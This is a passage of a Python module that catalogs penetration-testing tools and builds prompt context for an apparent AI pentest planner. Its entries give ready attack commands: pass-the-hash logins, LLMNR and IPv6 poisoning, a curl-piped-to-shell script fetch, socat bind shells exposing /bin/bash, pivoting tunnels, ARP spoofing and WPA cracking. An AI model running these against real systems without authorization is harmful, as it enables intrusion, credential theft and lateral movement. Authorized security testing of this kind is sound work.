        "name": "ldapdomaindump",
        "category": "ad-attack",
        "description": "Active Directory LDAP dumper — generates HTML/JSON reports",
        "auth": "authenticated",
        "examples": [
            "ldapdomaindump -u 'domain\\\\user' -p 'pass' {target}",
            "ldapdomaindump -u 'domain\\\\user' -p 'pass' {target} -o dump/",
        ],
        "flags": {
            "-u": "Username (domain\\\\user)",
            "-p": "Password",
            "-o": "Output directory",
        },
    },
    {
        "name": "evil-winrm",
        "category": "ad-attack",
        "description": "WinRM shell — PowerShell remote access with file transfer and more",
        "auth": "authenticated",
        "examples": [
            "evil-winrm -i {target} -u 'user' -p 'pass'",
            "evil-winrm -i {target} -u 'user' -H 'NTHASH'",
            "evil-winrm -i {target} -u 'user' -p 'pass' -s /path/to/scripts/ -e /path/to/exes/",
        ],
        "flags": {
            "-i": "Target IP",
            "-u": "Username",
            "-p": "Password",
            "-H": "NTLM hash (pass-the-hash)",
            "-s": "PowerShell scripts path",
            "-e": "Executables path",
        },
    },
    {
        "name": "pth-toolkit",
        "category": "ad-attack",
        "description": "Pass-the-hash toolkit — authenticate with NTLM hashes instead of passwords",
        "auth": "authenticated",
        "examples": [
            "pth-winexe -U 'domain/user%HASH' //{target} cmd.exe",
            "pth-smbclient -U 'domain/user%HASH' //{target}/C$",
            "pth-rpcclient -U 'domain/user%HASH' {target}",
        ],
        "flags": {
            "-U": "Credentials (domain/user%LM:NT)",
        },
    },
    {
        "name": "responder",
        "category": "ad-attack",
        "description": "LLMNR/NBT-NS/mDNS poisoner — capture NTLMv2 hashes on LAN",
        "auth": "none",
        "examples": [
            "responder -I eth0 -dwPv",
            "responder -I eth0 -A",
        ],
        "flags": {
            "-I": "Interface",
            "-d": "Enable DHCP answers",
            "-w": "Start WPAD proxy",
            "-P": "Force NTLM auth on proxy",
            "-A": "Analyze mode (passive, no poisoning)",
        },
    },
    {
        "name": "mitm6",
        "category": "ad-attack",
        "description": "IPv6 DNS takeover — relay NTLM auth via IPv6 DHCP",
        "auth": "none",
        "examples": [
            "mitm6 -d domain.local",
            "mitm6 -d domain.local -i eth0",
        ],
        "flags": {
            "-d": "Target domain",
            "-i": "Interface",
        },
    },
    # ══════════════════════════════════════════════════════════
    # PHASE 7: POST-EXPLOITATION
    # ══════════════════════════════════════════════════════════
    {
        "name": "linpeas",
        "category": "post-exploit",
        "description": "Linux privilege escalation enumeration script",
        "auth": "authenticated",
        "examples": [
            (
                "curl -L https://github.com/carlospolop/"
                "PEASS-ng/releases/latest/download/linpeas.sh"
                " | sh"
            ),
            "./linpeas.sh -a 2>&1 | tee linpeas_output.txt",
        ],
        "flags": {
            "-a": "All checks",
            "-s": "Superfast (skip slow checks)",
        },
    },
    {
        "name": "winpeas",
        "category": "post-exploit",
        "description": "Windows privilege escalation enumeration script",
        "auth": "authenticated",
        "examples": [
            "winPEASx64.exe",
            "winPEASx64.exe systeminfo userinfo",
            "winPEASany.exe quiet servicesinfo",
        ],
        "flags": {
            "quiet": "Minimal output",
            "systeminfo": "System information",
            "userinfo": "User information",
            "servicesinfo": "Service information",
        },
    },
    {
        "name": "linux-exploit-suggester",
        "category": "post-exploit",
        "description": "Suggest kernel exploits based on Linux kernel version",
        "auth": "authenticated",
        "examples": [
            "./linux-exploit-suggester.sh",
            "./linux-exploit-suggester.sh --uname '3.10.0-514.el7.x86_64'",
        ],
        "flags": {
            "--uname": "Kernel version string",
        },
    },
    {
        "name": "pspy",
        "category": "post-exploit",
        "description": "Unprivileged Linux process spy — monitor processes and cron without root",
        "auth": "authenticated",
        "examples": [
            "./pspy64",
            "./pspy64 -pf -i 1000",
        ],
        "flags": {
            "-pf": "Print commands and file events",
            "-i": "Interval in milliseconds",
        },
    },
    {
        "name": "powerview",
        "category": "post-exploit",
        "description": "PowerShell AD enumeration — find attack paths, ACLs, delegation",
        "auth": "authenticated",
        "examples": [
            "Import-Module .\\PowerView.ps1; Get-DomainUser -SPN",
            "Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse",
            "Find-DomainShare -CheckShareAccess",
            "Get-DomainGPO | Get-DomainGPOLocalGroup",
            "Find-LocalAdminAccess",
            "Invoke-ACLScanner -ResolveGUIDs",
        ],
        "flags": {},
    },
    {
        "name": "sharphound",
        "category": "post-exploit",
        "description": "BloodHound data collector for Windows — faster than bloodhound-python",
        "auth": "authenticated",
        "examples": [
            "SharpHound.exe -c all --zipfilename bh.zip",
            "SharpHound.exe -c all,gpolocalgroup --stealth",
            "Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp",
        ],
        "flags": {
            "-c": "Collection methods",
            "--zipfilename": "Output zip name",
            "--stealth": "Stealth mode (slower, less noise)",
        },
    },
    # ══════════════════════════════════════════════════════════
    # PHASE 8: LATERAL MOVEMENT & PIVOTING
    # ══════════════════════════════════════════════════════════
    {
        "name": "netcat",
        "category": "networking",
        "description": (
            "Swiss army knife for TCP/UDP"
            " — port listening, file transfer, reverse shells"
        ),
        "auth": "none",
        "examples": [
            "nc -lvnp 4444",
            "nc {target} 80",
            "nc -zv {target} 1-1000",
        ],
        "flags": {
            "-l": "Listen mode",
            "-v": "Verbose",
            "-n": "No DNS resolution",
            "-p": "Port",
            "-z": "Zero-I/O (scan mode)",
        },
    },
    {
        "name": "socat",
        "category": "networking",
        "description": "Advanced netcat — bidirectional data relay with SSL, fork, PTY support",
        "auth": "none",
        "examples": [
            "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid",
            "socat - TCP:{target}:80",
            "socat TCP-LISTEN:8080,reuseaddr,fork TCP:{target}:80",
            "socat OPENSSL-LISTEN:4444,cert=cert.pem,reuseaddr,fork EXEC:/bin/bash",
        ],
        "flags": {},
    },
    {
        "name": "chisel",
        "category": "networking",
        "description": "TCP/UDP tunneling over HTTP — pivot through firewalls",
        "auth": "none",
        "examples": [
            "chisel server --reverse -p 8080",
            "chisel client {lhost}:8080 R:socks",
            "chisel client {lhost}:8080 R:3389:{target}:3389",
        ],
        "flags": {
            "--reverse": "Allow reverse port forwarding",
            "R:": "Remote port forward",
        },
    },
    {
        "name": "ligolo-ng",
        "category": "networking",
        "description": "Advanced tunneling/pivoting — create TUN interface for seamless pivoting",
        "auth": "authenticated",
        "examples": [
            "ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
            "ligolo-agent -connect {lhost}:11601 -ignore-cert",
            "# On proxy: session, start, add route for internal network",
        ],
        "flags": {
            "-selfcert": "Auto-generate TLS certificate",
            "-laddr": "Listen address",
            "-connect": "Proxy address to connect to",
        },
    },
    {
        "name": "proxychains",
        "category": "networking",
        "description": (
            "Force TCP connections through SOCKS/HTTP proxies"
            " — pivot through compromised hosts"
        ),
        "auth": "none",
        "examples": [
            "proxychains nmap -sT -Pn -p 80,443,445 {target}",
            "proxychains curl http://{target}",
            "proxychains evil-winrm -i {target} -u 'user' -p 'pass'",
        ],
        "flags": {},
    },
    {
        "name": "sshuttle",
        "category": "networking",
        "description": "Transparent proxy/VPN over SSH — route traffic through compromised host",
        "auth": "authenticated",
        "examples": [
            "sshuttle -r user@{target} 10.0.0.0/8",
            "sshuttle -r user@{target} 0/0 --dns",
        ],
        "flags": {
            "-r": "Remote server",
            "--dns": "Forward DNS requests",
        },
    },
    # ══════════════════════════════════════════════════════════
    # WIRELESS ATTACKS
    # ══════════════════════════════════════════════════════════
    {
        "name": "aircrack-ng",
        "category": "wireless",
        "description": "WiFi security auditing suite — monitor, capture, crack WEP/WPA/WPA2",
        "auth": "none",
        "examples": [
            "airmon-ng start wlan0",
            "airodump-ng wlan0mon",
            "airodump-ng -c {channel} --bssid {bssid} -w capture wlan0mon",
            "aireplay-ng -0 5 -a {bssid} wlan0mon",
            "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
        ],
        "flags": {},
    },
    {
        "name": "wifite",
        "category": "wireless",
        "description": "Automated wireless auditing — WEP, WPA, WPS attacks",
        "auth": "none",
        "examples": [
            "wifite",
            "wifite --kill --wpa --dict /usr/share/wordlists/rockyou.txt",
        ],
        "flags": {
            "--kill": "Kill interfering processes",
            "--wpa": "Target WPA networks only",
            "--dict": "Wordlist for cracking",
        },
    },
    # ══════════════════════════════════════════════════════════
    # SNIFFING & MAN-IN-THE-MIDDLE
    # ══════════════════════════════════════════════════════════
    {
        "name": "wireshark",
        "category": "sniffing",
        "description": "Network protocol analyzer — capture and inspect traffic",
        "auth": "none",
        "examples": [
            "tshark -i eth0 -c 100",
            "tshark -i eth0 -f 'tcp port 80' -Y 'http.request'",
            "tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport",
            (
                "tshark -i eth0 -Y 'http.request.method == POST'"
                " -T fields -e http.host"
                " -e http.request.uri -e http.file_data"
            ),
        ],
        "flags": {
            "-i": "Interface",
            "-c": "Packet count",
            "-f": "Capture filter (BPF)",
            "-Y": "Display filter",
            "-r": "Read from file",
            "-T": "Output format",
        },
    },
    {
        "name": "bettercap",
        "category": "sniffing",
        "description": "Network attack and monitoring — ARP spoofing, DNS spoofing, proxy, sniffer",
        "auth": "none",
        "examples": [
            "bettercap -iface eth0",
            "bettercap -iface eth0 -caplet http-ui",
            (
                "bettercap -eval 'net.probe on; net.sniff on;"
                " set arp.spoof.targets {target}; arp.spoof on'"
            ),
        ],
        "flags": {
            "-iface": "Network interface",
            "-caplet": "Load caplet script",
            "-eval": "Run commands",
        },
    },
    # ══════════════════════════════════════════════════════════
    # DIGITAL FORENSICS & ANALYSIS
    # ══════════════════════════════════════════════════════════
    {
        "name": "volatility",
        "category": "forensics",
        "description": (
            "Memory forensics framework"
            " — analyze RAM dumps for malware, credentials, artifacts"
        ),
        "auth": "none",
        "examples": [
            "vol.py -f memory.dmp imageinfo",
            "vol.py -f memory.dmp --profile=Win10x64 pslist",
            "vol.py -f memory.dmp --profile=Win10x64 netscan",
            "vol.py -f memory.dmp --profile=Win10x64 hashdump",
            "vol.py -f memory.dmp --profile=Win10x64 malfind",
            "vol.py -f memory.dmp --profile=Win10x64 cmdline",
        ],
        "flags": {
            "-f": "Memory dump file",
            "--profile": "OS profile",
        },
    },
    {
        "name": "autopsy",
        "category": "forensics",
        "description": "Digital forensics platform — disk image analysis, file recovery, timeline",
        "auth": "none",
        "examples": [
            "autopsy &",
        ],
        "flags": {},
    },
    {
        "name": "binwalk",
        "category": "forensics",
        "description": "Firmware analysis — extract embedded files and file systems",
        "auth": "none",
        "examples": [
            "binwalk firmware.bin",
            "binwalk -e firmware.bin",
            "binwalk --signature firmware.bin",
        ],
        "flags": {
            "-e": "Extract files",
            "--signature": "Scan for file signatures",
        },
    },
    # ══════════════════════════════════════════════════════════
    # REPORTING & EVIDENCE
    # ══════════════════════════════════════════════════════════
    {
        "name": "cutycapt",
        "category": "reporting",
        "description": "Webpage screenshot capture — evidence collection for reports",
        "auth": "none",
        "examples": [
            "cutycapt --url=http://{target} --out=screenshot.png",
        ],
        "flags": {
            "--url": "Target URL",
            "--out": "Output file",
        },
    },
    {
        "name": "eyewitness",
        "category": "reporting",
        "description": "Web application screenshot and header capture — bulk evidence collection",
        "auth": "none",
        "examples": [
            "eyewitness --web -f urls.txt -d report/",
            "eyewitness --web --single http://{target} -d report/",
        ],
        "flags": {
            "--web": "Web mode",
            "-f": "URL file",
            "--single": "Single URL",
            "-d": "Output directory",
        },
    },
]


# ── Lookup helpers ────────────────────────────────────────

CATEGORIES = {
    "osint": "OSINT & Passive Recon",
    "recon": "Active Reconnaissance",
    "vuln-scan": "Vulnerability Scanning",
    "web": "Web Application Testing",
    "exploitation": "Exploitation Frameworks",
    "password": "Password Attacks",
    "ad-attack": "Active Directory Attacks",
    "post-exploit": "Post-Exploitation & Privilege Escalation",
    "networking": "Lateral Movement & Pivoting",
    "wireless": "Wireless Attacks",
    "sniffing": "Sniffing & Man-in-the-Middle",
    "forensics": "Digital Forensics",
    "reporting": "Reporting & Evidence",
}

# Pentest methodology phases — used by the AI planner
PENTEST_PHASES = {
    "unauthenticated": [
        ("osint", "Gather OSINT — emails, subdomains, tech stack, org structure"),
        ("recon", "Active scanning — port scan, service detection, OS fingerprint"),
        ("vuln-scan", "Vulnerability scanning — known CVEs, misconfigurations"),
        ("web", "Web app testing — directory brute, injection points, auth bypass"),
        ("password", "Password attacks — brute force exposed services, spray default creds"),
        ("wireless", "Wireless testing — rogue AP detection, WPA cracking"),
        ("sniffing", "Network sniffing — capture credentials, analyze protocols"),
        ("exploitation", "Exploit identified vulnerabilities to gain initial access"),
    ],
    "authenticated": [
        ("ad-attack", "AD enumeration — users, groups, SPNs, ACLs, attack paths"),
        ("post-exploit", "Privilege escalation — kernel exploits, misconfigs, cred harvesting"),
        ("ad-attack", "Credential attacks — Kerberoasting, AS-REP roasting, DCSync"),
        (
            "networking",
            "Lateral movement — pivot to internal hosts, tunnel through compromised systems",
        ),
        ("ad-attack", "Persistence — golden ticket, skeleton key, AD CS abuse"),
        ("forensics", "Evidence collection — memory dumps, disk artifacts"),
        ("reporting", "Documentation — screenshots, findings, remediation recommendations"),
    ],
}


def get_catalog() -> list[dict]:
    return TOOL_CATALOG


def get_categories() -> dict[str, str]:
    return CATEGORIES


def get_tools_by_category(category: str) -> list[dict]:
    return [t for t in TOOL_CATALOG if t["category"] == category]


def get_tool(name: str) -> dict | None:
    return next((t for t in TOOL_CATALOG if t["name"] == name), None)


def get_tools_for_phase(phase: str) -> list[dict]:
    """Get tools relevant to a pentest phase (unauthenticated or authenticated)."""
    if phase not in PENTEST_PHASES:
        return TOOL_CATALOG
    cats = {step[0] for step in PENTEST_PHASES[phase]}
    return [t for t in TOOL_CATALOG if t["category"] in cats]


def build_tool_context() -> str:
    """Build a compact text summary for LLM system prompts."""
    lines = []
    for cat_id, cat_name in CATEGORIES.items():
        tools = get_tools_by_category(cat_id)
        if tools:
            lines.append(f"\n## {cat_name}")
            for t in tools:
                auth_note = f" [{t.get('auth', 'both')}]" if t.get("auth") else ""
                lines.append(f"- **{t['name']}**{auth_note}: {t['description']}")
                for ex in t["examples"][:2]:
                    lines.append(f"  `{ex}`")
    return "\n".join(lines)


def build_methodology_context(phase: str = "both") -> str:
    """Build pentest methodology context for the AI planner."""
    lines = ["\n# Penetration Testing Methodology"]
    if phase in ("unauthenticated", "both"):
        lines.append("\n## Unauthenticated Phase (External/Black-Box)")
        for i, (cat, desc) in enumerate(PENTEST_PHASES["unauthenticated"], 1):
            tools = [t["name"] for t in get_tools_by_category(cat)]
            lines.append(f"{i}. **{desc}**")
            if tools:
                lines.append(f"   Tools: {', '.join(tools)}")
    if phase in ("authenticated", "both"):
        lines.append("\n## Authenticated Phase (Post-Compromise/Internal)")
        for i, (cat, desc) in enumerate(PENTEST_PHASES["authenticated"], 1):
            tools = [t["name"] for t in get_tools_by_category(cat)]
            lines.append(f"{i}. **{desc}**")
            if tools:
                lines.append(f"   Tools: {', '.join(tools)}")
    return "\n".join(lines)
